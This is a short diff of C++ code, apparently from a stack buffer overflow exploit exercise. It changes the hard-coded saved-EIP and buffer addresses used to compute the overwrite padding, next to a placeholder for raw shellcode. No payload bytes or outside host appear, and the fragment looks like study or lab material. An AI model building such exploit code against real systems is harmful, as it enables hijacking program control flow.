@@ -6,8 +6,8 @@ typedef unsigned int uint;
 
 std::string username = "dat_wil";
 
-uint eip = 0xffffd71c;
-uint bufferAddr = 0xffffd6cc;
+uint eip = 0xffffd60c;
+uint bufferAddr = 0xffffd5bc;
 uint padding = eip - bufferAddr;
 
 std::string raw_shellcode;
